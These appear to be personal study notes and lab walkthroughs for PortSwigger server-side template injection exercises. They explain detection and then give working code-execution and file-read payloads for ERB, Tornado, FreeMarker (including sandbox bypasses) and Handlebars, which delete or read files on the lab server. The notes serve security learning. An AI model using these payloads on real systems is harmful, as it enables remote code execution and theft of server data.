

good resources :

```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker
```

```
https://portswigger.net/research/server-side-template-injection
```

```
https://hacktricks.wiki/en/index.html
```


## What is server-side template injection?

Server-side template injection is when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side.

Template engines  generate web pages by combining fixed templates with volatile data.
Server-side template injection attacks can occur when user input is concatenated directly into a template, rather than passed in as data.

## What is the impact of server-side template injection?

- remote code execution
- gaining read access to sensitive data and arbitrary files on the server.


Twig template : an email that greets each user by their name.  safe way
```
$output = $twig->render("Dear {first_name},", array("first_name" => $user.first_name) );
```

dangerous way 

```
$output = $twig->render("Dear " . $_GET['name']);
```

`http://vulnerable-website.com/?name={{bad-stuff-here}}`


## ATTACK FLOW

![](images/Pasted%20image%2020260929051438.png)

### Detecting SSTI

try fuzzing the template by injecting a sequence of special characters commonly used in template expressions, such as `${{<%[%'"}}%\`. If an exception is raised, This is one sign that a vulnerability to server-side template injection may exist.


Server-side template injection vulnerabilities occur in two distinct contexts, each of which requires its own detection method.

#### Plaintext context

Most template languages allow you to freely input content either by using HTML tags directly or by using the template's native syntax, which will be rendered to HTML on the back-end before the HTTP response is sent.

`render('Hello ' + username)`

`http://vulnerable-website.com/?username=${7*7}`

If the response becomes:

```
Hello 49
```

then the server evaluated `7*7` → **possible SSTI**


Note that the specific syntax required to successfully evaluate the mathematical operation will vary depending on which template engine is being used.

#### Code context

user input being placed within a template expression.

```
greeting = getQueryParameter('greeting') engine.render("Hello {{"+greeting+"}}", data)
```

On the website, the resulting URL would be something like:

`http://vulnerable-website.com/?greeting=data.username`

One method of testing for server-side template injection in this context is to first establish that the parameter doesn't contain a direct XSS vulnerability by injecting arbitrary HTML into the value:

`http://vulnerable-website.com/?greeting=data.username<tag>`


Server creates:

```
Hello {{"+data.username<tag>+"}}
```

the template engine tries to parse `{{"+data.username<tag>+"}}` which is invalid because.

You might get:

- `Hello` → blank output
- encoded `<tag>`
- an error

This helps identify that you're inside a template expression.

The next step is to try and break out of the statement using common templating syntax and attempt to inject arbitrary HTML after it:

`http://vulnerable-website.com/?greeting=data.username}}<tag>`

server creates :

```
Hello {{"+data.username}}<tag>+"}}
```

the template engine tries to parse `{{"+data.username}}` which is valid. 

the output will be 

`Hello Carlos <tag>`

so now we know that there is SSTI vulnerability 

### Identifying Template Engine Type

##### Method 1: Trigger an Error

Sometimes the easiest way is to send invalid template syntax.

`<%= foobar %>`
Suppose the server uses Ruby ERB.

ERB tries to evaluate: `foobar`

but no variable called `foobar` exists.

Result: `undefined local variable or method `foobar'

and the stack trace mentions: `erb.rb`


#####  Method 2: Mathematical Expressions

| Engine     | Example Syntax |
| ---------- | -------------- |
| Jinja2     | `{{7*7}}`      |
| Twig       | `{{7*7}}`      |
| ERB        | `<%= 7*7 %>`   |
| Freemarker | `${7*7}`       |
| Velocity   | `#set($x=7)`   |

If errors are hidden, try payloads from different engines.
If the response changes to: `49`

then that syntax was probably interpreted.

NOTE : One Payload Is Not Enough

in Twig `{{7*'7'}}`    -> 49
in Jinja2 `{{7*'7'}}`   -> 7777777

7777777   -> so that's a strong clue you're dealing with **Jinja2**
49 -> so that's a strong clue you're dealing with **twig**



# Lab: Basic server-side template injection


after browsing the website i noticed that when clicking on productId=1 it gives me :
![](images/Pasted%20image%2020260929072418.png)

checking the request:

![](images/Pasted%20image%2020260929072515.png)


notice that u can change massage parameter so let's try to detect SSTI vuln:  

using this table to detect plain text context : 

| Engine     | Example Syntax |
| ---------- | -------------- |
| Jinja2     | `{{7*7}}`      |
| Twig       | `{{7*7}}`      |
| ERB        | `<%= 7*7 %>`   |
| Freemarker | `${7*7}`       |
| Velocity   | `#set($x=7)`   |


![](images/Pasted%20image%2020260929070242.png)


![](images/Pasted%20image%2020260929070303.png)

so here the template used is ERB Template.
now lets search on google reviewing  the ERB documentation to find out how to execute arbitrary code

ERB Template :

`<% code %>` -> used to execute code
`<%= 7*7 %>`    -> used to output expressions 

`<%= File.delete("path")%>`
`<%= File.read("path")%>`
`<%= Dir.chdir("path"); Dir.pwd; %>`

so now we need to delete the given file `morale.txt` from carlos directory

add this payload:
`banki <%= File.delete("/home/carlos/morale.txt")%>`
after url encoding: 
`banki+<%25%3d+File.delete("/home/carlos/morale.txt")%25>`

Lab solved ^-^

`banki <%= Dir.chdir("/home/carlos"); Dir.pwd; %>`
![](images/Pasted%20image%2020260929072005.png)








# Lab: Basic server-side template injection (code context)

Notice that on the "My account" page, you can select whether you want the site to use your full name, first name, or nickname.

set it to nickname then send the request to burp repeater.
now go to any blog post and post a comment.
u'll notice that your name is h0td0g.
![](images/Pasted%20image%2020260929074330.png)

![](images/Pasted%20image%2020260929074415.png)

on burp repeater set blog-post-author parameter to zoro

![](images/Pasted%20image%2020260929074607.png)

![](images/Pasted%20image%2020260929074730.png)

notice that the output reveals that the template used is tornado template!!

tornado template expressions are surrounded with double curly braces `{{  7*7 }}`

try :  `{{  7*7 }}`  error .  we can conclude from the error that this is a code context.

try:
![](images/Pasted%20image%2020260929075509.png)

![](images/Pasted%20image%2020260929075652.png)

now go study about tornado template and how to handle OS files 

```
user.nickname}}{% import os %}{{os.system('rm /home/carlos/morale.txt')
```

![](images/Pasted%20image%2020260929080657.png)





### Read about the security implications

When you identify the template engine (ERB, Jinja2, Twig, Tornado, etc.), go to its documentation and look for:

- Security warnings
- Dangerous built-in functions
- File access features
- Command execution features
- Template inclusion/import features

```
Identify the template engine → Read its documentation → Look for security warnings and dangerous built-ins → Use them to find ways to read files, access objects, or execute code
```


# Lab: Server-side template injection using documentation

login as content manager using the given credentials:
`content-manager:C0nt3ntM4n4g3r`

![](images/Pasted%20image%2020261001024426.png)


![](images/Pasted%20image%2020261001024447.png)

notice that when visit a post there is a "Edit Template" button.

![](images/Pasted%20image%2020261001021454.png)
now lets know what is the template engine used.
to do this just add zoro inside ${product.name}.

![](images/Pasted%20image%2020261001021942.png)

now we know the template used is FreemMarker template , let's read its documentation and find dangerous built ins functions .

![](images/Pasted%20image%2020261001023852.png)


Methods of Command Execution in FreeMarker:

![](images/Pasted%20image%2020261001030459.png)


this is a pure java code 
`freemarker.template.utility.Execute()?new("command")`

the freemarker.temp...utility.Execute is a class used for executing commands,
now we want to instantiate an object of this class using new operator

to execute it on freemarker template we should follow the  syntax rules used in this template:
```
<#assign ex="freemarker.template.utility.Execute"?new()> 
${ex("id")}
```

here we are assigning the instantiated object to ex variable.
now we can use ex to use commands.


![](images/Pasted%20image%2020261001025156.png)


now let's delete morale.txt file:

```
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("rm /home/carlos/morale.txt")}
```

![](images/Pasted%20image%2020261001030327.png)





### Look for known exploits

Another key aspect of exploiting server-side template injection vulnerabilities is being good at finding additional resources online. Once you are able to identify the template engine being used, you should browse the web for any vulnerabilities that others may have already discovered.


# Lab: Server-side template injection in an unknown language with a documented exploit


![](images/Pasted%20image%2020261001041608.png)


![](images/Pasted%20image%2020261001041655.png)

notice that we can change massage parameter so let's try to detect SSTI VULN:


| Engine     | Example Syntax |
| ---------- | -------------- |
| Jinja2     | `{{7*7}}`      |
| Twig       | `{{7*7}}`      |
| ERB        | `<%= 7*7 %>`   |
| Freemarker | `${7*7}`       |
| Velocity   | `#set($x=7)`   |
didn't work. 

let's try fuzzing:

```
$
{{
<
%
[
%
\
'
"
}
}
%
\\
```

in burp intruder add the given payload:
![](images/Pasted%20image%2020261001042537.png)

start the attack , found that one of the requests having 500 status code, which was the one with `{{`  payload

![](images/Pasted%20image%2020261001042814.png)

notice that the template engine used was Node.js `HandlerBars` Template.
#### searching for Server-Side Template Injection (SSTI)  command exec in Node.js Handlebars


![](images/Pasted%20image%2020261001044312.png)

inside execSync() add the following command : `rm /home/carlos/morale.txt`

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('rm /home/carlos/morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

in URL , add the payload in massage parameter  after the payload being URL Encoded.

![](images/Pasted%20image%2020261001044921.png)

![](images/Pasted%20image%2020261001045034.png)






## Explore

At this point, you might have already stumbled across a workable exploit using the documentation. If not, the next step is to explore the environment and try to discover all the objects to which you have access.
Many template engines expose a "self" or "environment" object of some kind, which acts like a namespace containing all objects, methods, and attributes that are supported by the template engine.

for example : in Java-based templating languages
`${T(java.lang.System).getenv()}`


####NOTE 
**for Burp Suite Professional users, the Intruder provides a built-in wordlist for brute-forcing variable names.**


### Developer-supplied objects

It is important to note that websites will contain both built-in objects provided by the template and custom, site-specific objects that have been supplied by the web developer.

Developer-supplied objects are especially likely to contain sensitive information or exploitable methods.

####NOTE 
**if u can't achieve remote code execution , You can still leverage server-side template injection vulnerabilities for other high-severity exploits, such as file path traversal, to gain access to sensitive data.**



# Lab: Server-side template injection with information disclosure via user-supplied objects

login as content manager:
`content-manager:C0nt3ntM4n4g3r`

notice that when visit a post there is an "Edit Template" button.
![](images/Pasted%20image%2020261001062150.png)


![](images/Pasted%20image%2020261001062231.png)

now lets know what is the template engine used.
to do this just add } inside ${product.name} to break the syntax.

![](images/Pasted%20image%2020261001062455.png)

![](images/Pasted%20image%2020261001062551.png)

##### searching for objects in django template that can be helpful for information disclosure:

![](images/Pasted%20image%2020261001070233.png)


try :

![](images/Pasted%20image%2020261001064710.png)

![](images/Pasted%20image%2020261001064722.png)

i gave it to AI and told me that there is a `settings`  variable which can be used to get sensitive information.  


![](images/Pasted%20image%2020261001065417.png)

add :
![](images/Pasted%20image%2020261001065430.png)

![](images/Pasted%20image%2020261001065456.png)

submit it.





## Create a custom attack

sometimes you will need to construct a custom exploit. For example, you might find that the template engine executes templates inside a sandbox, which can make exploitation difficult, or even impossible.

After identifying the attack surface, if there is no obvious way to exploit the vulnerability, the first step is to identify objects and methods to which you have access. 
then make a shortlist of objects that you want to investigate more thoroughly.

then you can discover combinations of objects and methods that you can chain together. Chaining together the right objects and methods sometimes allows you to gain access to dangerous functionality and sensitive data that initially appears out of reach.




# Lab: Server-side template injection in a sandboxed environment

login as content manager:
`content-manager:C0nt3ntM4n4g3r`

notice that when visit a post there is an "Edit Template" button. 

![](images/Pasted%20image%2020261002040239.png)

now let's enumerate the template engine type:
![](images/Pasted%20image%2020261002040447.png)


Exploitation Time:

try the previously used payload:
```
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("rm /home/carlos/morale.txt")}
```

![](images/Pasted%20image%2020261002040742.png)

let's search on google about how to bypass sandbox restriction:

Hacktricks website:
![](images/Pasted%20image%2020261002043712.png)

let's try them : 

```
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}

```

![](images/Pasted%20image%2020261002043910.png)

The output  contained the contents of the file as decimal ASCII code points.
Convert the returned bytes to ASCII.

![](images/Pasted%20image%2020261002044602.png)

submit the password.


2)

in this payload change replace article with product, id with `cat /home/carlos/my_password.txt`

```
<#assign classloader=product.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("cat /home/carlos/my_password.txt")}

```


![](images/Pasted%20image%2020261002044228.png)

submit the password.
![](images/Pasted%20image%2020261002044249.png)




# Lab: Server-side template injection with a custom exploit

first login as wiener: peter

to solve the lab we need to delete 
```
/home/carlos/.ssh/id_rsa
```


![](images/Pasted%20image%2020261002064254.png)
notice that there are a lot of parameters that we can test it.

i tried Email and didn't work.


![](images/Pasted%20image%2020261002060940.png)


change blog-author-display parameter to `{7*7}`


![](images/Pasted%20image%2020261002061723.png)

It's a TWING TEMPLATE.
notice that it's vulnerable. so we can search for exploits about this template.

i searched on google about common exploits used for this template and none of them worked.
![](images/Pasted%20image%2020261002064149.png)


now let's see what we can do with avatar upload functionality:

uploading a normal image:
![](images/Pasted%20image%2020261002064650.png)

nothing special , so now what if a add a normal file like .txt :

![](images/Pasted%20image%2020261002065121.png)

notice that there is a setAvatar() function that we can use it.
Also take note of the file path `/home/carlos/User.php` and `/home/carlos/avatar_upload.php`


send change-blog-post-author request to repeater.
add this payload:
```
user.setAvatar('/home/carlos/User.php','image/jpg')
```

now visit this url to view the contents of php file :
`/avatar?avatar=wiener`

![](images/Pasted%20image%2020261002070326.png)

reading that php file, i found gdprdelete() function which delete user's avatar.

right now, we can set `/home/carlos/.ssh/id_rsa` as user's avatar  using setAvatar()
then use gdprDelete() to delete that file.

![](images/Pasted%20image%2020261002071128.png)

![](images/Pasted%20image%2020261002073927.png)

lab solved!!

